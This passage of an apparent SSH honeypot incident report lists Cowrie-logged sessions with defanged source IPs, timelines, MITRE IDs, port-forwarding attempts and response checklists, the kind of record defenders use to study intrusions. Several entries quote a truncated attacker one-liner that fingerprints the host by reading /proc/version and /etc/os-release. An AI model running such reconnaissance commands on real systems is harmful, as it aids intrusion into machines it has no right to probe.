| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:25:38` | `cowrie.session.connect` |
| `2026-08-03 21:25:39` | `cowrie.client.version` |
| `2026-08-03 21:25:39` | `cowrie.client.kex` |
| `2026-08-03 21:25:40` | `cowrie.login.success` |
| `2026-08-03 21:25:41` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f151c7e1786

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]119` |
| **First Seen** | 2026-08-03 21:25 |
| **Last Seen** | 2026-08-03 21:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:25:43` | `cowrie.session.connect` |
| `2026-08-03 21:25:44` | `cowrie.client.version` |
| `2026-08-03 21:25:44` | `cowrie.client.kex` |
| `2026-08-03 21:25:46` | `cowrie.login.success` |
| `2026-08-03 21:25:46` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]119` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec472fd59523

| Field | Detail |
|---|---|
| **Source IP** | `112.27.129[.]78` |
| **First Seen** | 2026-08-03 21:26 |
| **Last Seen** | 2026-08-03 21:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:26:44` | `cowrie.session.connect` |
| `2026-08-03 21:26:45` | `cowrie.client.version` |
| `2026-08-03 21:26:45` | `cowrie.client.kex` |
| `2026-08-03 21:26:49` | `cowrie.login.success` |
| `2026-08-03 21:26:49` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.27.129[.]78` to AbuseIPDB if not already reported
- [ ] Block `112.27.129[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ee28701c83

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:27 |
| **Last Seen** | 2026-08-03 21:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:27:17` | `cowrie.session.connect` |
| `2026-08-03 21:27:17` | `cowrie.client.version` |
| `2026-08-03 21:27:17` | `cowrie.client.kex` |
| `2026-08-03 21:27:18` | `cowrie.login.success` |
| `2026-08-03 21:27:20` | `cowrie.session.params` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.success` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.command.input` |
| `2026-08-03 21:27:20` | `cowrie.log.closed` |
| `2026-08-03 21:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e5624bb94e9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:29 |
| **Last Seen** | 2026-08-03 21:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:29:27` | `cowrie.session.connect` |
| `2026-08-03 21:29:27` | `cowrie.client.version` |
| `2026-08-03 21:29:27` | `cowrie.client.kex` |
| `2026-08-03 21:29:29` | `cowrie.login.success` |
| `2026-08-03 21:29:30` | `cowrie.session.params` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.success` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:30` | `cowrie.command.input` |
| `2026-08-03 21:29:31` | `cowrie.log.closed` |
| `2026-08-03 21:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aecc3fdca77

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:31 |
| **Last Seen** | 2026-08-03 21:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:31:34` | `cowrie.session.connect` |
| `2026-08-03 21:31:34` | `cowrie.client.version` |
| `2026-08-03 21:31:34` | `cowrie.client.kex` |
| `2026-08-03 21:31:36` | `cowrie.login.success` |
| `2026-08-03 21:31:38` | `cowrie.session.params` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.success` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.command.input` |
| `2026-08-03 21:31:38` | `cowrie.log.closed` |
| `2026-08-03 21:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9529301b5c6

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-08-03 21:31 |
| **Last Seen** | 2026-08-03 21:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:31:56` | `cowrie.session.connect` |
| `2026-08-03 21:31:57` | `cowrie.client.version` |
| `2026-08-03 21:31:57` | `cowrie.client.kex` |
| `2026-08-03 21:31:59` | `cowrie.login.success` |
| `2026-08-03 21:32:00` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fb1c3805340

| Field | Detail |
|---|---|
| **Source IP** | `207.46.224[.]80` |
| **First Seen** | 2026-08-03 21:33 |
| **Last Seen** | 2026-08-03 21:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:33:01` | `cowrie.session.connect` |
| `2026-08-03 21:33:01` | `cowrie.client.version` |
| `2026-08-03 21:33:01` | `cowrie.client.kex` |
| `2026-08-03 21:33:02` | `cowrie.login.success` |
| `2026-08-03 21:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.46.224[.]80` to AbuseIPDB if not already reported
- [ ] Block `207.46.224[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07b037de4b0d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:33 |
| **Last Seen** | 2026-08-03 21:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:33:48` | `cowrie.session.connect` |
| `2026-08-03 21:33:48` | `cowrie.client.version` |
| `2026-08-03 21:33:48` | `cowrie.client.kex` |
| `2026-08-03 21:33:50` | `cowrie.login.success` |
| `2026-08-03 21:33:52` | `cowrie.session.params` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.success` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.command.input` |
| `2026-08-03 21:33:52` | `cowrie.log.closed` |
| `2026-08-03 21:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2dab3f63c85

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-08-03 21:33 |
| **Last Seen** | 2026-08-03 21:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:33:50` | `cowrie.session.connect` |
| `2026-08-03 21:33:52` | `cowrie.client.version` |
| `2026-08-03 21:33:52` | `cowrie.client.kex` |
| `2026-08-03 21:33:54` | `cowrie.login.success` |
| `2026-08-03 21:33:55` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98bf8d3c9be

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-08-03 21:34 |
| **Last Seen** | 2026-08-03 21:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:34:00` | `cowrie.session.connect` |
| `2026-08-03 21:34:01` | `cowrie.client.version` |
| `2026-08-03 21:34:01` | `cowrie.client.kex` |
| `2026-08-03 21:34:03` | `cowrie.login.success` |
| `2026-08-03 21:34:04` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57c28a1c00c6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-03 21:34 |
| **Last Seen** | 2026-08-03 21:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:34:45` | `cowrie.session.connect` |
| `2026-08-03 21:34:45` | `cowrie.client.version` |
| `2026-08-03 21:34:45` | `cowrie.client.kex` |
| `2026-08-03 21:34:45` | `cowrie.login.success` |
| `2026-08-03 21:34:46` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:34:46` | `cowrie.direct-tcpip.data` |
| `2026-08-03 21:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c94d6ec32c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:35 |
| **Last Seen** | 2026-08-03 21:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:35:56` | `cowrie.session.connect` |
| `2026-08-03 21:35:56` | `cowrie.client.version` |
| `2026-08-03 21:35:56` | `cowrie.client.kex` |
| `2026-08-03 21:35:58` | `cowrie.login.success` |
| `2026-08-03 21:35:59` | `cowrie.session.params` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.success` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.command.input` |
| `2026-08-03 21:36:00` | `cowrie.log.closed` |
| `2026-08-03 21:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c292620c676a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:38 |
| **Last Seen** | 2026-08-03 21:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:38:10` | `cowrie.session.connect` |
| `2026-08-03 21:38:11` | `cowrie.client.version` |
| `2026-08-03 21:38:11` | `cowrie.client.kex` |
| `2026-08-03 21:38:12` | `cowrie.login.success` |
| `2026-08-03 21:38:13` | `cowrie.session.params` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.success` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:13` | `cowrie.command.input` |
| `2026-08-03 21:38:14` | `cowrie.log.closed` |
| `2026-08-03 21:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea4a4ccdab43

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:40 |
| **Last Seen** | 2026-08-03 21:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:40:26` | `cowrie.session.connect` |
| `2026-08-03 21:40:26` | `cowrie.client.version` |
| `2026-08-03 21:40:26` | `cowrie.client.kex` |
| `2026-08-03 21:40:27` | `cowrie.login.success` |
| `2026-08-03 21:40:29` | `cowrie.session.params` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.success` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.command.input` |
| `2026-08-03 21:40:29` | `cowrie.log.closed` |
| `2026-08-03 21:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b382339de49

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:42 |
| **Last Seen** | 2026-08-03 21:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:42:39` | `cowrie.session.connect` |
| `2026-08-03 21:42:40` | `cowrie.client.version` |
| `2026-08-03 21:42:40` | `cowrie.client.kex` |
| `2026-08-03 21:42:41` | `cowrie.login.success` |
| `2026-08-03 21:42:42` | `cowrie.session.params` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.success` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:42` | `cowrie.command.input` |
| `2026-08-03 21:42:43` | `cowrie.log.closed` |
| `2026-08-03 21:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53733cdabacc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:44 |
| **Last Seen** | 2026-08-03 21:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
